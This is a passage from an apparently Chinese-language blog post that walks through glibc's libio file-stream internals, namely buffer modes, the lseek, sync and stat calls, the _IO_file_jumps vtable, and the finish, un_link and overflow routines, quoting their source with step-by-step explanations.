buffered output, _IO_write_base==base() &amp;&amp; epptr()==base().</span></span><br><span class="line"><span class="comment">   However, ptr() may be anywhere between base() and ebuf().</span></span><br><span class="line"><span class="comment">   This forces a call to filebuf::overflow(int C) on every put.</span></span><br><span class="line"><span class="comment">   If there is more space in the buffer, and C is not a &#x27;\n&#x27;,</span></span><br><span class="line"><span class="comment">   then C is inserted, and pptr() incremented.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   UNBUFFERED STREAMS:</span></span><br><span class="line"><span class="comment">   If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>大致如下</p><ol><li><strong>文件流的模式</strong>：文件流可以处于put模式、get模式或putback模式中。Putback模式是get模式的一种变体。</li><li><strong>文件缓冲区中的当前位置</strong>：在文件缓冲区中，<strong>只有一个当前位置</strong>，而不是分别有get指针和put指针。在get模式中，当前位置是gptr()的位置；在put模式中，当前位置是pptr()的位置。</li><li><strong>缓冲区位置与外部文件系统位置的对应</strong>：通常情况下，缓冲区中与外部文件系统位置对应的位置是_IO_read_end，但在putback模式下，它是_IO_save_end，并且在文件处于附加模式时也是_IO_save_end。这是因为从读模式切换到写模式会自动将外部文件系统位置切换到文件的末尾。如果字段_fb._offset &gt;= 0，则它表示与eGptr()对应的文件整体偏移。</li><li><strong>PUT模式</strong>：在put模式下，_IO_read_ptr、_IO_read_end和_IO_read_base都相等。它们通常等于_IO_buf_base，但如果从get模式切换到put模式，它们不一定相等。_IO_write_base不为空，通常等于_IO_buf_base。_IO_write_end等于_IO_buf_end，但<strong>只在完全缓冲模式下成立</strong>。<u>未刷新的字符位于_IO_write_base和_IO_write_ptr之间。</u></li><li><strong>GET模式</strong>：在get或putback模式下，eback() != egptr()。在get模式中，<u>未读字符位于gptr()和egptr()之间</u>。操作系统文件位置对应于egptr()的位置。</li><li><strong>PUTBACK模式</strong>：putback模式用于记住已经通过sputbackc放回的“多余”字符，它们存储在特殊的putback缓冲区中。在putback模式中，get缓冲区指向特殊的putback缓冲区。未读字符包括putback缓冲区中gptr()和egptr()之间的字符，以及指向原始预留缓冲区的save_gptr()和save_egptr()之间的区域。操作系统位置对应于save_egptr()的位置。</li><li><strong>行缓冲输出</strong>：在行缓冲输出期间，_IO_write_base等于base()，<strong>并且epptr()也等于base()</strong>。但是，ptr()可能位于base()和ebuf()之间。这会导致在<strong>每次放入字符时调用</strong>filebuf::overflow(int C)。如果缓冲区中还有更多空间(pptr&lt;ebuf)，并且C不是’\n’，则会插入C，并增加pptr(),否则刷新写入。</li><li><strong>无缓冲流</strong>：如果文件缓冲区是unbuffered()，则_shortbuf[1]用作缓冲区。</li></ol><h1 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h1><h2 id="lseek"><a href="#lseek" class="headerlink" title="lseek"></a>lseek</h2><p><code>seek</code> 是一个用于文件操作的系统调用，它的主要功能是用于改变文件指针的位置，从而实现对文件的随机访问。具体来说，<code>seek</code> 的功能包括：</p><ol><li>定位文件指针：<code>seek</code> 允许你将文件指针（读/写位置）移动到文件中的任意位置。这是对文件进行随机访问的关键操作。你可以指定要移动到的位置，通常是相对于文件开头的偏移量。</li><li>读取和写入特定位置：通过改变文件指针的位置，你可以在文件中的任何位置进行读取和写入操作，而不必按照顺序逐个字节进行操作。这对于访问大型文件或数据库非常有用。</li><li>支持文件的随机访问：<code>seek</code> 是实现随机访问的关键，允许你在不必按照文件顺序读取数据的情况下，快速访问和处理文件的各个部分。</li><li>实现文件的截断和扩展：在某些情况下，<code>seek</code> 可以用于截断文件（减小文件大小）或扩展文件（增大文件大小）。通过移动文件指针并写入数据，你可以实现这些操作。</li></ol><p>其返回值表示成功执行操作后的文件偏移量，如果出现错误，返回值会是 <code>-1</code>。</p><p>具体来说，<code>lseek</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>fd</code> 是文件描述符，用于指定要进行定位操作的文件。</li><li><code>offset</code> 是一个偏移量，用于指定要移动的相对位置。可以为正数、负数或零，具体取决于 <code>whence</code> 参数的值。</li><li><code>whence</code> 用于确定偏移量的基准位置，通常可以取以下值之一：<ul><li><code>SEEK_SET</code>：以文件开头为基准，<code>offset</code> 指定的位置。</li><li><code>SEEK_CUR</code>：以当前文件位置为基准，增加 <code>offset</code> 指定的位置。</li><li><code>SEEK_END</code>：以文件末尾为基准，增加 <code>offset</code> 指定的位置。</li></ul></li></ul><p><code>lseek</code> 函数会根据 <code>offset</code> 和 <code>whence</code> 的指定值来移动文件描述符 <code>fd</code> 的偏移位置，并返回新的文件偏移位置。如果操作成功，返回值是新的偏移位置。如果出现错误，返回值是 <code>-1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_set 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_cur 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_end 2</span></span><br></pre></td></tr></table></figure><h2 id="sync"><a href="#sync" class="headerlink" title="sync"></a>sync</h2><p><code>sync</code> 是一个系统调用，它的主要功能是将操作系统内核中尚未写入磁盘的缓冲区数据强制刷新到磁盘上的存储设备，<strong>以确保数据持久性和文件系统的一致性</strong>。<code>sync</code> 的主要功能包括：</p><ol><li>数据持久性：通过执行 <code>sync</code>，操作系统会将所有尚未写入磁盘的数据写入到物理存储设备中。这可以确保即使系统崩溃或断电，尚未写入磁盘的数据也不会丢失。</li><li>文件系统一致性：<code>sync</code> 也有助于维护文件系统的一致性。在写入文件和目录信息时，文件系统通常会维护内部数据结构，这些数据结构需要及时写入磁盘以确保文件系统的一致性。<code>sync</code> 确保这些数据结构及其相关的数据被写入磁盘。</li><li>缓冲区刷新：<code>sync</code> 还用于刷新内核中的缓冲区，以确保缓冲区中的数据被写入磁盘。这对于正在进行的文件操作和文件系统操作非常重要，因为数据通常首先存储在内存中以提高性能，然后定期刷新到磁盘上。</li><li>数据完整性：<code>sync</code> 还有助于维护数据的完整性。它确保了所有写入的数据都已经被持久地存储在磁盘上，以免数据损坏或丢失。</li></ol><h2 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h2><p>系统调用 <code>stat</code> 用于获取关于文件或目录的信息，如文件的大小、访问权限、所属用户和组、文件类型等。它<strong>返回一个包含文件信息的结构体</strong>，通常被称为 <code>struct stat</code>。</p><p><code>stat</code> 系统调用的功能包括：</p><ol><li><p>获取文件的基本属性：<code>stat</code> 可以用来获取文件的基本属性，如文件大小、创建时间、修改时间、访问时间等。</p></li><li><p>获取文件的权限信息：<code>stat</code> 可以提供文件的权限信息，包括文件的拥有者、所属组以及其他用户的权限。</p></li><li><p>确定文件的类型：<code>stat</code> 可以告诉您文件是普通文件、目录、符号链接还是其他类型的文件。</p></li><li><p>获取文件的相关信息：<code>stat</code> 可以提供有关文件系统的信息，如文件系统的块大小、设备号等。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">stat64</span> &#123;</span></span><br><span class="line">  <span class="type">_dev_t</span> st_dev;<span class="comment">//文件所在的设备的标识符</span></span><br><span class="line">  <span class="type">_ino_t</span> st_ino;<span class="comment">//文件的 inode 号</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> st_mode;<span class="comment">//文件的权限和类型信息</span></span><br><span class="line">  <span class="type">short</span> st_nlink;<span class="comment">//文件的硬链接数目</span></span><br><span class="line">  <span class="type">short</span> st_uid;<span class="comment">//文件的用户标识符 (UID)</span></span><br><span class="line">  <span class="type">short</span> st_gid;<span class="comment">//文件的组标识符 (GID)</span></span><br><span class="line">  <span class="type">_dev_t</span> st_rdev;<span class="comment">//特殊文件的设备标识符</span></span><br><span class="line">  __MINGW_EXTENSION __int64 st_size;<span class="comment">//文件的大小，以字节为单位</span></span><br><span class="line">  <span class="type">__time64_t</span> st_atime;<span class="comment">//最后访问时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_mtime;<span class="comment">//最后修改时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_ctime;<span class="comment">//状态改变时间</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他还有用到read,write,open,close都较为熟悉就不记录了</p><h1 id="IO虚表函数"><a href="#IO虚表函数" class="headerlink" title="IO虚表函数"></a>IO虚表函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_file_jumps)</span><br></pre></td></tr></table></figure><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish的主要功能是关闭缓冲区,解除文件流在_IO_list_all中的链接</p><h3 id="1-IO-new-file-finish"><a href="#1-IO-new-file-finish" class="headerlink" title="1 _IO_new_file_finish"></a>1 _IO_new_file_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><ol><li>先是检查文件是否打开,是则调用_IO_do_flush (fp)并根据 _IO_DELETE_DONT_CLOSE标志位决定是否调用close关闭文件流</li><li>_IO_default_finish (fp, 0);</li></ol><h3 id="2-1-IO-do-flush"><a href="#2-1-IO-do-flush" class="headerlink" title="2-1 _IO_do_flush"></a>2-1 _IO_do_flush</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>根据是是否是宽字节有两个分支</p><p>目前先看非宽字节分支,调用的是另一个虚表函数write,这里先不写</p><h3 id="2-2-IO-default-finish"><a href="#2-2-IO-default-finish" class="headerlink" title="2-2 _IO_default_finish"></a>2-2 _IO_default_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><ol><li>若buf不为空且_IO_USER_BUF标志为0,释放free缓冲区,并置空buf指针</li><li>将文件流的所有marker的_sbuf字段清空</li><li>若文件流的_IO_save_base不为空,则将其free释放并置空</li><li>调用unlink将文件流解除_IO_list_all链</li></ol><h3 id="3-IO-un-link"><a href="#3-IO-un-link" class="headerlink" title="3 _IO_un_link"></a>3 _IO_un_link</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>先确认文件流在_IO_list_all链中</li><li>寻找_IO_list_all链中的fp将其解链并清除_IO_LINKED标志位</li></ol><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p><code>overflow</code> 主要负责将数据写入底层文件(或设备)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><ol><li>判断文件流是否设置_IO_NO_WRITES,是则标记错误并返回</li><li><ul><li>如果文件不处于写入模式(_IO_CURRENTLY_PUTTING)或者_IO_write_base为空<ul><li>如果是_IO_write_base为空的情况,先通过_IO_doallocbuf申请buf缓冲区,并设置read指针</li><li>如果文件流正在备份(_IO_IN_BACKUP)<ul><li>调用_IO_free_backup_area (f)</li><li>f-&gt;_IO_read_base减去f-&gt;_IO_read_end - f-&gt;_IO_read_ptr和f-&gt;_IO_read_base - f-&gt;_IO_buf_base中更小的那个</li><li>f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</li></ul></li><li>如果f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end,将f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</li><li>将w-ptr和w-base设置为r-ptr,w-end设置为b-end,r-base和r-ptr设置为r-end(之后这些指针一般用简写)</li><li>设置_IO_CURRENTLY_PUTTING位</li><li>若文件流是行缓冲或无缓冲模式且非宽字符w-end=w-ptr</li></ul></li></ul></li><li>如果参数ch为EOF,调用_IO_do_write</li><li>如果w-ptr==b-end,调用_IO_do_flush如果返回EOF则直接return EOF</li><li>*f-&gt;_IO_write_ptr++=ch</li><li>如果文件是无缓冲或者是行缓冲且ch为’\n’,调用_IO_do_write如果返回EOF则直接return EOF</li><li>返回ch</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span 